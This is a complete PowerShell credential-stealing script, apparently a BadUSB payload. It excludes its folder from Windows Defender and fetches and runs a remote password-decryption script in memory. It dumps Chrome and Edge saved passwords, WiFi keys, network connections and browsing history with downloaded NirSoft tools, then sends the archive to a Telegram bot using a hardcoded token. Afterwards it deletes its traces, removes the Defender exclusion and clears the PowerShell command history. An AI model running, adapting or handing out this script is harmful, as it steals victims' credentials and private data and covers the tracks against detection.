#                      _                        
#  _   _  ___  _   _  | | ___ __   _____      __
# | | | |/ _ \| | | | | |/ /  _ \ / _ \ \ /\ / /
# | |_| | (_) | | |_|_|   <| | | | (_) \ V  V / 
#  \__, |\___/ \__,_(_)_|\_\_| |_|\___/ \_/\_/  
#  |___/                                           
#
# FIXED: Chrome v20 App-Bound Encryption handled via Invoke-PowerChrome (fileless)
# Legacy NirSoft tools for WiFi, shares, and non-Chromium history

$basePath = "C:\Users\Public\Documents\scripts"
$dumpFolder = "$basePath\$env:USERNAME-$(get-date -f yyyy-MM-dd)"
$dumpFile = "$dumpFolder.zip"

# Create working directory
New-Item -ItemType Directory -Path $basePath -Force | Out-Null
Set-Location $basePath
New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null
Add-MpPreference -ExclusionPath $basePath -Force

# ------------------------------------------------------------
# 1. CHROME / EDGE PASSWORDS (v20 App-Bound Encryption)
#    Pure PowerShell, loaded in memory - no EXE needed
# ------------------------------------------------------------
Write-Host "[*] Decrypting Chrome/Edge passwords (v20 ABE-aware)..."

# Load Invoke-PowerChrome from GitHub (fileless)
$psScript = (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/The-Viper-One/Invoke-PowerChrome/refs/heads/main/Invoke-PowerChrome.ps1").Content
Invoke-Expression $psScript

# Dump Chrome passwords
$chromePasswords = Invoke-PowerChrome -Browser Chrome -HideBanner 2>&1 | Out-String
$chromePasswords | Out-File -FilePath "$dumpFolder\chrome_passwords.txt" -Encoding utf8

# Dump Edge passwords
$edgePasswords = Invoke-PowerChrome -Browser Edge -HideBanner 2>&1 | Out-String
$edgePasswords | Out-File -FilePath "$dumpFolder\edge_passwords.txt" -Encoding utf8

# ------------------------------------------------------------
# 2. DOWNLOAD & RUN LEGACY NIRSOFT TOOLS
#    (WiFi, network shares, non-Chrome browsing history)
# ------------------------------------------------------------
Write-Host "[*] Downloading legacy tools..."
Invoke-WebRequest -Uri "https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WirelessKeyView.exe?raw=true" `
    -OutFile "WirelessKeyView.exe"
Invoke-WebRequest -Uri "https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WNetWatcher.exe?raw=true" `
    -OutFile "WNetWatcher.exe"
Invoke-WebRequest -Uri "https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/BrowsingHistoryView.exe?raw=true" `
    -OutFile "BrowsingHistoryView.exe"

# WiFi keys
Write-Host "[*] Extracting WiFi passwords..."
.\WirelessKeyView.exe /stext "$dumpFolder\wifi.txt"

# Network shares
Write-Host "[*] Extracting network connections..."
.\WNetWatcher.exe /stext "$dumpFolder\connected_devices.txt"

# Browsing history (Firefox, IE, legacy browsers)
Write-Host "[*] Extracting browsing history..."
.\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext "$dumpFolder\history.txt"

# ------------------------------------------------------------
# 3. WAIT FOR ALL FILES
# ------------------------------------------------------------
$requiredFiles = @(
    "$dumpFolder\chrome_passwords.txt",
    "$dumpFolder\wifi.txt",
    "$dumpFolder\connected_devices.txt",
    "$dumpFolder\history.txt"
)

$timeout = 45
$elapsed = 0
while ($elapsed -lt $timeout) {
    $allExist = $true
    foreach ($f in $requiredFiles) {
        if (-not (Test-Path $f)) { $allExist = $false; break }
    }
    if ($allExist) { break }
    Start-Sleep -Seconds 1
    $elapsed++
}

# ------------------------------------------------------------
# 4. COMPRESS
# ------------------------------------------------------------
Compress-Archive -Path "$dumpFolder\*" -DestinationPath "$dumpFile" -Force

while (!(Test-Path "$dumpFile")) {
    Start-Sleep -Seconds 1
}

# ------------------------------------------------------------
# 5. EXFILTRATE VIA TELEGRAM
# ------------------------------------------------------------
$token = "8981154010:AAHQoIVUkCdLbdtFyh6s3467kU5XVWdMF58"
$chatID = "6337521340"
$uri = "https://api.telegram.org/bot$token/sendDocument"
$caption = "Exfil data from $env:USERNAME | Chrome ABE-passwords cracked"

if (!(Test-Path $dumpFile)) { exit 1 }

# Ensure System.Net.Http is available
if (-not ("System.Net.Http.HttpClient" -as [type])) {
    $httpPath = Get-ChildItem -Path "C:\Windows\Microsoft.NET\Framework64\" -Recurse `
        -Filter "System.Net.Http.dll" | Select-Object -First 1 -ExpandProperty FullName
    if ($httpPath) { Add-Type -Path $httpPath } else { exit 1 }
}

$client = New-Object System.Net.Http.HttpClient
$content = New-Object System.Net.Http.MultipartFormDataContent
$content.Add((New-Object System.Net.Http.StringContent($chatID)), "chat_id")
$content.Add((New-Object System.Net.Http.StringContent($caption)), "caption")

$filename = [System.IO.Path]::GetFileName("$dumpFile")
$fileStream = [System.IO.File]::OpenRead("$dumpFile")
$fileContent = New-Object System.Net.Http.StreamContent($fileStream)
$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
$content.Add($fileContent, "document", $filename)

try { $client.PostAsync($uri, $content).Wait() } catch {}

# Cleanup
$fileStream.Close()
$fileStream.Dispose()
Set-Location C:\Users\Public\Documents
Remove-Item -Recurse -Force scripts
Remove-MpPreference -ExclusionPath "C:\Users\Public\Documents\scripts" -Force

# Caps Lock signal
$keyBoardObject = New-Object -ComObject WScript.Shell
for ($i=0; $i -lt 4; $i++) {
    $keyBoardObject.SendKeys("{CAPSLOCK}")
    Start-Sleep -Seconds 1
}

# Clear PowerShell command history
Clear-Content (Get-PSReadlineOption).HistorySavePath

exit
